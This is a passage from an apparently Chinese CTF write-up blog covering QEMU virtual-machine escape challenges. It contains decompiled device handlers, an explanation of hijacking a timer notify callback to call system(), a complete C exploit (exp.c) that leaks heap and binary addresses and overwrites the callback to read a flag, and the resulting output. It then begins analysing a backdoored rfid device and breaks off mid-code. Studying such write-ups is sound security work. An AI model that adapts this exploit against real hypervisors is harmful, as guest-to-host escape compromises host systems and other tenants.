+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">cdecl <span class="title">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> val; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  val = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( !addr )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;addr;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;addr &amp; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    val = opaque-&gt;regs[opaque-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> saddr; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> &amp;&amp; !(opaque-&gt;addr &amp; <span class="number">3</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        saddr = opaque-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( saddr == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( saddr &lt; <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          srand(val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( saddr == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[<span class="number">3</span>] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[saddr] = val;</span><br><span class="line">          <span class="keyword">if</span> ( opaque-&gt;flag )</span><br><span class="line">          &#123;</span><br><span class="line">            v4 = qemu_clock_get_ms_4(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(&amp;opaque-&gt;strng_timer, v4 + <span class="number">100</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个链是这样的：<code>timer_mod</code>-&gt;<code>timer_mod_ns</code>-&gt;<code>timerlist_rearm</code>-&gt;<code>timerlist_notify</code>-&gt;<code>(timer_list-&gt;notify_cb)(timer_list-&gt;notify_opaque);</code>，因为STRNGState后面跟了这个结构体，所以可以直接覆写其中的<code>cb</code>为<code>system@plt</code>，<code>opaque</code>为<code>cat /home/wz/flag</code>的地址，为了方便，我还是把它写到了<code>reg[2]</code>，然后泄露其地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">timer_mod</span><span class="params">(QEMUTimer_0 *ts, <span class="keyword">int64_t</span> expire_time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  timer_mod_ns(ts, expire_time * ts-&gt;scale);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">timer_mod_ns</span><span class="params">(QEMUTimer_0 *ts, <span class="keyword">int64_t</span> expire_time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">_Bool</span> rearm; <span class="comment">// ST17_1</span></span><br><span class="line">  QEMUTimerList_0 *timer_list; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  timer_list = ts-&gt;timer_list;</span><br><span class="line">  qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">  timer_del_locked(timer_list, ts);</span><br><span class="line">  rearm = timer_mod_ns_locked(timer_list, ts, expire_time);</span><br><span class="line">  qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">  <span class="keyword">if</span> ( rearm )</span><br><span class="line">    timerlist_rearm(timer_list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">timerlist_rearm</span><span class="params">(QEMUTimerList_0 *timer_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( timer_list-&gt;clock-&gt;type == <span class="number">1</span> )</span><br><span class="line">    qemu_start_warp_timer();</span><br><span class="line">  timerlist_notify(timer_list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">timerlist_notify</span><span class="params">(QEMUTimerList_0 *timer_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( timer_list-&gt;notify_cb )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *))timer_list-&gt;notify_cb)(timer_list-&gt;notify_opaque);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qemu_notify_event();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="exp-c-1"><a href="#exp-c-1" class="headerlink" title="exp.c"></a>exp.c</h3><p>泄露地址拿gdb调下就好，这个里面没法ssh，所以exp需要打包到磁盘文件再从qemu启动本地读flag。打包命令为<code>find . | cpio -o --format=newc &gt; rootfs.cpio</code>，其他跟第一道题没什么区别，调试一下看看偏移就好</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc010</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem+addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem+addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)(inl(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_abread(<span class="keyword">uint32_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//return the value of (addr &gt;&gt; 2)</span></span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    <span class="comment">//pmio_abwrite(0x100,0x12345678);</span></span><br><span class="line">    <span class="comment">//write args</span></span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x6d6f682f</span>);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">0x7a772f65</span>);</span><br><span class="line">    mmio_write(<span class="number">20</span>,<span class="number">0x616c662f</span>);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">0x67</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    <span class="comment">//set priviledge</span></span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">"IO permission denied!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//leak args/heap</span></span><br><span class="line">	<span class="keyword">uint64_t</span> heap_addr=pmio_abread((<span class="number">71</span> &lt;&lt; <span class="number">2</span>));</span><br><span class="line">    heap_addr=heap_addr&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    heap_addr+=pmio_abread((<span class="number">70</span> &lt;&lt; <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">uint64_t</span> arg_addr = heap_addr + <span class="number">0xb00</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]arg addr: 0x%llx\n"</span>,arg_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> proc_addr = pmio_abread(<span class="number">69</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    proc_addr = proc_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    proc_addr += pmio_abread(<span class="number">68</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> proc_base = proc_addr - <span class="number">2731150</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]proc addr: 0x%llx\n"</span>,proc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = proc_base + <span class="number">0x200d50</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]system addr: 0x%llx\n"</span>,system_plt);</span><br><span class="line">    <span class="comment">//get flag</span></span><br><span class="line">    pmio_abwrite((<span class="number">70</span>&lt;&lt;<span class="number">2</span>),arg_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    pmio_abwrite((<span class="number">68</span>&lt;&lt;<span class="number">2</span>),system_plt &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终结果：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to QEMU-ESCAPE</span><br><span class="line">qemu login: root</span><br><span class="line"><span class="comment"># cd /</span></span><br><span class="line"><span class="comment"># ./exp</span></span><br><span class="line">mmio_mem @ 0xf7762000</span><br><span class="line">[+]arg addr: 0x555558288570</span><br><span class="line">[+]proc addr: 0x555555554000</span><br><span class="line">[+]system addr: 0x555555754d50</span><br><span class="line"><span class="comment"># happy_new_year_2020!</span></span><br></pre></td></tr></table></figure>
+<h2 id="数字经济线下RealWorld-Qemu-Escape"><a href="#数字经济线下RealWorld-Qemu-Escape" class="headerlink" title="数字经济线下RealWorld-Qemu-Escape"></a>数字经济线下RealWorld-Qemu-Escape</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>俩月前的比赛，当时自闭了两天，docker逃逸在<a href="https://ama2in9.top/2019/12/12/docker_escape/" target="_blank" rel="noopener">这里</a>,browser的题在<a href="https://p1umer.github.io/2019/10/14/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Realworld-Browser-writeup/" target="_blank" rel="noopener">p1umer</a>和<a href="https://e3pem.github.io/2019/11/20/browser/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Browser/" target="_blank" rel="noopener">e3pem</a></p>
+<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>在当时我对qemu一无所知的时候看到了<code>-device rfid</code>，但是去IDA搜相关函数没搜到就放弃了，实际上二进制文件去掉了符号表，增大了分析难度，之所以要增加这个难度，就是因为这个题太简单了，直接给了个后门。</p>
+<p>下面一步步开始分析。</p>
+<p>首先没有符号表，我们搜下<code>rfid</code>的字符串,根据之前的分析可以知道入口函数<code>rfid_class_init</code>里会有字符串<code>rfid_class_init</code>，所以根据引用可以找到<code>rfid_class_init</code>，里面那一堆是各种<code>id</code>，这个不必要再做区分，等会qemu里直接看设备基本就能对应上(或者找一个有符号表的qemu题按照偏移对照一下)</p>
+<p><img src="/2020/01/03/strng/5.png" alt="rfid"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">rfid_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = sub_70031D(a1, <span class="string">"pci-device"</span>, <span class="string">"/home/wang/qemu/hw/misc/myrfid.c"</span>, <span class="number">0x171</span>LL, <span class="string">"rfid_class_init"</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_rfid_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x420</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x1337</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x69</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在class_init里，一定要给个<code>realize</code>函数，所以这里唯一一个函数指针可以推断出是<code>pci_rfid_realize</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">pci_rfid_realize</span><span class="params">(__int64 pdev, __int64 errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_570742(*(_QWORD *)(pdev + <span class="number">120</span>), <span class="number">1L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_5C950D(pdev, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="number">1L</span>L, <span class="number">0L</span>L, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_570635(pdev + <span class="number">2688</span>, <span class="number">1L</span>L, sub_570A2E, pdev);</span><br><span class="line">    sub_843CE1(pdev + <span class="number">2520</span>);</span><br><span class="line">    sub_843FBD(pdev + <span class="number">2576</span>);</span><br><span class="line">    sub_8449B4(pdev + <span class="number">2512</span>, <span class="string">"rfid"</span>, what, pdev, <span class="number">0L</span>L);</span><br><span class="line">    sub_31B892(pdev + <span class="number">2272</span>, pdev, rfid_mmio_ops, pdev, <span class="string">"rfid-mmio"</span>, &amp;off_1000000);</span><br><span class="line">    sub_5C1EF2((_QWORD *)pdev, <span class="number">0</span>, <span class="number">0</span>, pdev + <span class="number">2272</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这时候再找个以前做过的qemu题，看看里面函数的参数，可以发现<code>sub_31B892</code>这个函数有6个参数且有字符串<code>rfid-mmio</code>，这就很显然这个函数是<code>memory_region_init_io</code>，而里面的第三个参数就是<code>rfid_mmio_ops</code>了。点进去看下，第一个函数指针是<code>rfid_mmio_read</code>，第二个是<code>rfid_mmio_write</code>。如此一来就找到了关键的<code>read/write</code>函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9720 rfid_mmio_ops   dq offset rfid_mmio_read</span><br><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9720                                         ; DATA XREF: pci_rfid_realize+<span class="number">111</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9728                 dq offset rfid_mmio_write</span><br></pre></td></tr></table></figure>
+<p>先看<code>rfid_mmio_read</code>，第二个参数为我们输入的地址，判断<code>((addr &gt;&gt; 20) &amp; 0xF) != 15</code>，后面比较两个字符串，后者为<code>wwssadadBABA</code>，前者根据引用发现赋值来自<code>rfid_mmio_write</code>，比较成功之后执行<code>command</code>，看引用也来自<code>rfid_mmio_write</code>，下面分析write函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">rfid_mmio_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ((addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>) != <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(off_10CC100);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(input, off_10CC100, v2) )</span><br><span class="line">      system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">270438L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>rfid_mmio_write</code>函数的逻辑实际上就是个小菜单，<code>(addr &gt;&gt; 20) &amp; 0xF</code>作为<code>result</code>。<br>如果<code>result</code>为<code>[0,5]</code>，就给<code>input[idx]</code>赋不同的固定值，<code>idx</code>为<code>(addr &gt;&gt; 16) &amp; 0xF</code>;如果<code>result</code>为<code>6</code>，就往<code>command</code>里拷贝数据，<code>src</code>为<code>&amp;n[4]</code>，而在程序开始我们<code>*(_QWORD *)&amp;n[4] = value;</code>将value赋值给了它，因此这里的<code>memcpy</code>实际上等同于<code>command[(unsigned __int16)arg11] = value</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__<span class="function">fastcall <span class="title">rfid_mmio_write</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 